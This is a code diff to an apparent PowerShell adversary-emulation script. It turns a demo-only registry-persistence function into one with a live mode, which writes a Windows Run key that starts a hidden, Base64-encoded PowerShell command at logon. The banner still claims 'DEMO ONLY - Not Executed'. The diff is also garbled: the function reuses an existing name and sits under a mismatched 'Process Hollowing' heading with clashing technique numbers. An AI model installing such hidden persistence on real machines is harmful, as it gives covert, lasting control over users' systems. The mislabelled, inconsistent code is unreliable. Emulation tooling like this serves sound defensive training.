@@ -284,21 +284,40 @@ function Set-EnvPayload {
 # ==========================================================================
 # TECHNIQUE 7: PROCESS HOLLOWING CONCEPT
 # ==========================================================================
-function Show-RegistryPersistence {
-    Write-Host "[+] Technique 5: Registry-Based Persistence (DEMO ONLY - Not Executed)" -ForegroundColor Green
+# =========================================================================
+# TECHNIQUE 7: PROCESS HOLLOWING CONCEPT
+# ==============================================================================
+function Set-EnvPayload {
+    Write-Host "[+] Technique 7: Registry-Based Persistence (DEMO ONLY - Not Executed)" -ForegroundColor Green
 
+    # Define the payload command and its Base64 encoding
+    $payload = 'Add-Content -Path "C:\temp\execution_marker.txt" -Value "Successfully executed payload via Reg Run Key."'
+    $encodedPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
+
+    # --- DEMO MODE ---
     if ($Global:DemoMode) {
         Write-Host "    [*] Demonstrating registry-based persistence concepts:" -ForegroundColor Gray
-        Write-Host "    [*] - HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -ForegroundColor Gray
-        Write-Host "    [*] - Values here run commands at user logon" -ForegroundColor Gray
-        Write-Host "" 
+        Write-Host "    [*] HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -ForegroundColor Gray
+        Write-Host "    [*] Values here run commands at user logon" -ForegroundColor Gray
+        Write-Host ""
         Write-Host "    [DEMO] Example commands (not executed):" -ForegroundColor Yellow
-        Write-Host "    Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'MyApp' -Value 'powershell.exe -WindowStyle Hidden -EncodedCommand <base64>'" -ForegroundColor DarkGray
-        Write-Host "    Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'MyApp'" -ForegroundColor DarkGray
+        Write-Host "    Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'MyApp' -Value 'powershell.exe -WindowStyle Hidden -EncodedCommand <base64>'" -ForegroundColor DarkGray
+        Write-Host "    Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'MyApp'" -ForegroundColor DarkGray
         Write-Host "" 
         Write-Host "    [DEMO] Blue Team should monitor Run keys for suspicious entries." -ForegroundColor Yellow
     }
+    
+    # --- LIVE MODE (Actual Persistence) ---
+    if (-not $Global:DemoMode) {
+        $registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+        $regKeyName = "DemoApp"
+        
+        # Set the persistence key
+        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "$regKeyName" -Value "powershell.exe -WindowStyle Hidden -EncodedCommand $encodedPayload" -Type String -Force
+        Write-Host "    [LIVE] Successfully set registry persistence key: $registryPath\$regKeyName" -ForegroundColor Green
+    }
 }
+
 
 function Show-WMIEventSub {
     Write-Host "[+] Technique 6: WMI Event Subscription (DEMO ONLY - Not Executed)" -ForegroundColor Green
